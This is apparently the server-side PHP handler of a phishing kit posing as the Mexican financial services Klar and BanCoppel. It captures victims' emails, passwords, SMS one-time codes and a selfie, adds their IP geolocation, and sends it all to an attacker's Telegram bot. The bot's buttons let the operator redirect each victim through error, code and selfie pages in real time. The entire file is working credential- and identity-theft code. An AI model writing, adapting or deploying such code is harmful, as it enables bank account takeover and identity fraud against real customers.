<?php
session_start();
require_once 'config.php';

$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

function get_ip_info($user_ip) {
    $url = "https://ipinfo.io/{$user_ip}/json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error en cURL: ' . curl_error($ch);
        return null;
    }
    curl_close($ch);
    return json_decode($response, true);
}

$locationData = get_ip_info($user_ip);
$cc = $locationData['country'] ?? 'No disponible';
$city = $locationData['city'] ?? 'No disponible';
$region = $locationData['region'] ?? 'No disponible';

if (!file_exists('requests')) {
    mkdir('requests', 0777, true);
}

$form_origen = "desconocido";
$message = "";

// index.php
if (isset($_POST['email'], $_POST['password'])) {
    $_SESSION['usuario'] = $_POST['email'];
    $form_origen = "index.php";
    $message .= "🌑Klar Logo🌑\n\n";
    $message .= "📧 Correo.: " . $_POST['email'] . "\n";
    $message .= "🔒 Password.: " . $_POST['password'] . "\n";

// index-error.php
} elseif (isset($_POST['email_err'], $_POST['password_err'])) {
    $_SESSION['usuario'] = $_POST['email_err'];
    $form_origen = "index-error.php";
    $message .= "🌑Klar Logo-Reintento🌑\n\n";
    $message .= "📧 Correo.: " . $_POST['email_err'] . "\n";
    $message .= "🔒 Password.: " . $_POST['password_err'] . "\n";

// otp.php
} elseif (isset($_POST['cod1'])) {
    $code = trim($_POST['cod1']);
    $_SESSION['code'] = $code;
    $form_origen = "sms.php";
    $message .= "🌑Klar Código🌑\n\n";
    $message .= "📲 Código: $code\n\n";
    $message .= "🍀 User: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// otp-error.php
} elseif (isset($_POST['cod2'])) {
    $code = trim($_POST['cod2']);
    $_SESSION['code'] = $code;
    $form_origen = "sms-error.php";
    $message .= "🌑Klar Código-Reintento🌑\n\n";
    $message .= "📲 Código: $code\n\n";
    $message .= "🍀 User: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// selfie.php
} elseif (isset($_FILES['foto_file']) && $_FILES['foto_file']['error'] === UPLOAD_ERR_OK) {
    $form_origen = "selfie.php";
    $message .= "📸 Selfie Capturada📸\n\n";
    $message .= "🧍 Usuario: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// mail.php
} elseif (isset($_POST['email'], $_POST['clave'])) {
    $form_origen = "mail.php";
    $message .= "🔵BanCoppel Correo🔵\n\n";
    $message .= "📩 Correo: " . $_POST['email'] . "\n";
    $message .= "🔑 Clave: " . $_POST['clave'] . "\n";
    $message .= "\n";
    $message .= "🍀 User: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

// mail-error.php
} elseif (isset($_POST['email2'], $_POST['clave2'])) {
    $form_origen = "mail-error.php";
    $message .= "🔵BanCoppel Correo-Error🔵\n\n";
    $message .= "📩 Correo: " . $_POST['email2'] . "\n";
    $message .= "🔑 Clave: " . $_POST['clave2'] . "\n";
    $message .= "\n";
    $message .= "🍀 User: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n";

} else {
    exit("No se reconocieron datos válidos.");
}

$message .= "\n🌎 Ubicación: $cc - $region - $city\n";
$message .= "🌐 IP: $user_ip";

$request_id = session_id();
$_SESSION['estado'] = null;

$request_data = [
    'usuario' => $_SESSION['usuario'] ?? 'Desconocido',
    'estado' => null
];
file_put_contents("requests/$request_id.json", json_encode($request_data));

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Index', 'callback_data' => "redir:$request_id:index.php"],
            ['text' => '❌ Index Error', 'callback_data' => "redir:$request_id:index-error.php"]
        ],
        [
            ['text' => '✅ Código', 'callback_data' => "redir:$request_id:sms.php"],
            ['text' => '❌ Código Error', 'callback_data' => "redir:$request_id:sms-error.php"]
        ],
        [
            ['text' => '✅ Selfie', 'callback_data' => "redir:$request_id:selfie.php"],
            ['text' => '❌ Selfie Error', 'callback_data' => "redir:$request_id:selfie-error.php"]
        ],
        [
            ['text' => '✅ Finalizar', 'callback_data' => "redir:$request_id:finalizar.php"]
        ]
    ]
];

$url = "https://api.telegram.org/bot" . $bot_token_2 . "/sendMessage";
$payload = [
    'chat_id' => $chat_id_2,
    'text' => $message,
    'reply_markup' => json_encode($keyboard),
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Enviar imagen si fue capturada
if ($form_origen === "selfie.php" && isset($_FILES['foto_file']) && $_FILES['foto_file']['error'] === UPLOAD_ERR_OK) {
    $photoPath = $_FILES['foto_file']['tmp_name'];

    $urlPhoto = "https://api.telegram.org/bot" . $bot_token_2 . "/sendPhoto";
    $payloadPhoto = [
        'chat_id' => $chat_id_2,
        'caption' => "📸 Selfie recibida\n🍀 User: " . ($_SESSION['usuario'] ?? 'Desconocido') . "\n🌎 $cc - $region - $city\n🌐 IP: $user_ip",
        'parse_mode' => 'HTML',
        'photo' => new CURLFile($photoPath)
    ];

    $chPhoto = curl_init($urlPhoto);
    curl_setopt($chPhoto, CURLOPT_POSTFIELDS, $payloadPhoto);
    curl_setopt($chPhoto, CURLOPT_RETURNTRANSFER, true);
    curl_exec($chPhoto);
    curl_close($chPhoto);
}

header("Location: load.php?id=" . $request_id);
exit;